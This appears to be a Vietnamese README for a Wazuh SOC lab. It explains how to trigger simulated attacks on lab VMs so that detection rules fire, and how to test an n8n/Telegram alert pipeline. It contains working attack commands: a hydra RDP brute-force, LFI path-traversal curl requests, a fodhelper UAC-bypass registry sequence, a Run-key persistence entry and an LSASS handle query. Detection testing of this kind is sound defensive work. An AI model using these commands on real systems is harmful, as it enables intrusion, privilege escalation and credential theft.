# ⚔️ Cẩm Nang Kích Hoạt Tấn Công & Kiểm Thử E2E (Attack & Testing Guide)

Tài liệu hướng dẫn chi tiết cách kích hoạt 3 kịch bản tấn công thực nghiệm và các bộ kiểm thử tự động hóa toàn trình (End-to-End) trong phòng Lab Wazuh SOC.

---

## 📌 Bảng Tổng Quan Các Kịch Bản Kiểm Thử

| Kịch Bản | Mục Tiêu Tấn Công | Kỹ Thuật MITRE ATT&CK | Quy Tắc Wazuh Phát Hiện | Lệnh Chạy Tự Động Từ Host |
| :--- | :--- | :--- | :--- | :--- |
| **Scenario 1** | RDP Brute Force | `T1110.001` (Password Guessing) | Rule `100001` (Single Fail), `100002` (Brute Force Detected) | `python tests/e2e/scenario_rdp_bruteforce.py --execute` |
| **Scenario 2** | Web Apache LFI | `T1190` (Exploit Public App) | Rule `87105` (Custom LFI Decoder `web-access-lfi`) | `python tests/e2e/scenario_lfi_web.py --execute` |
| **Scenario 3** | Full Kill Chain | `T1059.001`, `T1548.002`, `T1547.001`, `T1003.001` | Rule `100004`, `100007`, `100006`, `100005` (Sysmon) | `python tests/e2e/scenario_full_killchain.py --execute` |
| **SOAR Webhook** | Pipeline Test | N/A (E2E Integration) | Webhook Ingest $\rightarrow$ Threat Intel $\rightarrow$ Telegram | `python tests/e2e/test_soar_webhook.py` |
| **Lab Health** | Infrastructure | N/A (Connectivity) | Ping, SSH, WinRM, Docker Ports (443, 5678, 5985) | `python tests/e2e/lab_health.py` |

---

## 1. 🔍 Kiểm Tra Sức Khỏe Toàn Bộ Phòng Lab (Lab Healthcheck)

Trước khi chạy bất kỳ bài test nào, hãy đảm bảo cả 3 máy ảo và các dịch vụ đều đang hoạt động:

```powershell
# Chạy từ thư mục gốc dự án trên Windows Host:
python tests/e2e/lab_health.py
```

*Kết quả mong đợi:*
- ✅ `wazuh-vm` (192.168.71.128): Port 22 (SSH), Port 443 (Dashboard), Port 5678 (n8n) `[PASS]`
- ✅ `windows-vm` (192.168.71.129): Port 5985 (WinRM), Port 3389 (RDP), Port 80 (Apache) `[PASS]`
- ✅ `kali-vm` (192.168.71.130): Port 22 (SSH) `[PASS]`

---

## 2. 💥 Scenario 1: Tấn Công RDP Brute Force & Khóa IP (Rule 100001 / 100002)

### Cách A: Chạy Tự Động Bằng Python Runner (Khuyên Dùng)
Runner sẽ tự động điều khiển máy Kali qua SSH để bắn các lượt đăng nhập sai RDP vào Windows 10, sau đó truy vấn Wazuh API xác minh cảnh báo:

```powershell
python tests/e2e/scenario_rdp_bruteforce.py --execute
```

### Cách B: Kích Hoạt Thủ Công Từ Máy Kali Linux
```powershell
# Gọi trực tiếp từ máy host sang Kali:
ssh kali-vm "hydra -l testw -P /usr/share/wordlists/metasploit/unix_passwords.txt rdp://192.168.71.129 -t 4 -V"
```
*Hoặc dùng `xfreerdp` bắn 8 lần thử:*
```powershell
ssh kali-vm "for i in {1..8}; do xfreerdp /u:testw /p:WrongPass\$i /v:192.168.71.129 +auth-only; sleep 1; done"
```

### Kiểm Tra Kết Quả Phản Hồi:
```powershell
# 1. Xem cảnh báo Rule 100002 trên Wazuh:
ssh wazuh-vm "docker exec single-node-wazuh.manager-1 grep '100002' /var/ossec/logs/alerts/alerts.json | tail -n 1 | jq ."

# 2. Kiểm tra luật tường lửa chặn IP trên Windows Victim:
$cred = Get-Credential -UserName socrunner
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    Get-NetFirewallRule | Where-Object { $_.DisplayName -like "*WAZUH*" } | Select-Object DisplayName, Action, Enabled
}
```

---

## 3. 🌐 Scenario 2: Tấn Công Web Apache LFI (Rule 87105)

### Điều kiện tiên quyết:
Dịch vụ Apache (XAMPP) phải đang chạy trên máy Windows 10 (Port 80).

### Cách A: Chạy Tự Động Bằng Python Runner
```powershell
python tests/e2e/scenario_lfi_web.py --execute
```

### Cách B: Kích Hoạt Thủ Công Từ Kali
```powershell
ssh kali-vm "curl -s -o /dev/null -w '%{http_code}\n' 'http://192.168.71.129/index.php?page=../../../../windows/win.ini'"
ssh kali-vm "curl -s -o /dev/null -w '%{http_code}\n' 'http://192.168.71.129/index.php?page=..%2f..%2f..%2f..%2fwindows%2fsystem.ini'"
```

### Kiểm Tra Decoder & Rule:
```powershell
# Xem cảnh báo Rule 87105 trong alerts.json:
ssh wazuh-vm "docker exec single-node-wazuh.manager-1 grep '87105' /var/ossec/logs/alerts/alerts.json | tail -n 1 | jq ."
```

---

## 4. 🥷 Scenario 3: Tấn Công Chuỗi Full Kill Chain & Sysmon (Rule 100004 - 100007)

Mô phỏng chuỗi 4 giai đoạn tấn công nâng cao theo chuẩn MITRE ATT&CK trên Windows 10 Endpoint.

### Cách A: Chạy Tự Động Bằng Python Runner
```powershell
python tests/e2e/scenario_full_killchain.py --execute
```

### Cách B: Kích Hoạt Từng Bước Qua WinRM (`socrunner`)
```powershell
$cred = Get-Credential -UserName socrunner

# Giai đoạn 1: Execution (Mã hóa PowerShell Base64 - Rule 100004)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAVwBhAHoAdQBoAC0AUwBPAEMALQBLAGkAbABsAEMAaABhAGkAbgAtAFQAZQBzAHQAIgA=
}

# Giai đoạn 2: Privilege Escalation (UAC Bypass Fodhelper - Rule 100007)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"
}

# Giai đoạn 3: Persistence (Registry Run Key - Rule 100006)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WazuhLabPersistenceTest" -Value "C:\Windows\System32\cmd.exe /c whoami" -Force
}

# Giai đoạn 4: Credential Access (Truy cập bộ nhớ LSASS - Rule 100005)
Invoke-Command -ComputerName 192.168.71.129 -Credential $cred -ScriptBlock {
    $proc = Get-Process lsass
    $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
    Write-Host "LSASS Queried handle: $handle"
}
```

---

## 5. 🤖 Kiểm Thử Đường Truyền Tự Động Hóa SOAR & Webhook n8n

Kiểm tra xem webhook ingest của n8n có nhận diện chính xác payload và điều phối gửi thông báo Telegram ChatOps hay không:

```powershell
python tests/e2e/test_soar_webhook.py
```

*Luồng kiểm thử:*
1. Sinh alert giả lập có `rule_id: 100007` (Critical UAC Bypass).
2. Gửi HTTP POST trực tiếp tới `http://192.168.71.128:5678/webhook/wazuh-alert`.
3. Kiểm tra mã phản hồi HTTP `200 OK`.
4. Mở Telegram kiểm tra bot `@my_wazuh_soc_alert_bot` có gửi tin nhắn cảnh báo tương tác kèm 3 nút bấm phản ứng hay không.
